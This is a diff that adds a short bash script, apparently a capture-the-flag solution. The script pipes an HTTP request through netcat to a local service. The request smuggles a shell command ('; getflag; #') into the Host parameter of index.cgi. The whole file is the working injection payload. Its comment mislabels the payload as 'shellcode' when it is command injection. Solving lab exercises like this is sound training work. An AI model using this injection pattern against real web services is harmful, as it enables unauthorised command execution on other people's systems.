@@ -1,0 +1,5 @@
+#!/bin/bash
+
+# Send the shellcode using Netcat.
+echo -e "GET /index.cgi?Host=%3B+getflag%3B+%23 HTTP/1.0\r\n\r\n" | nc localhost 7007
+
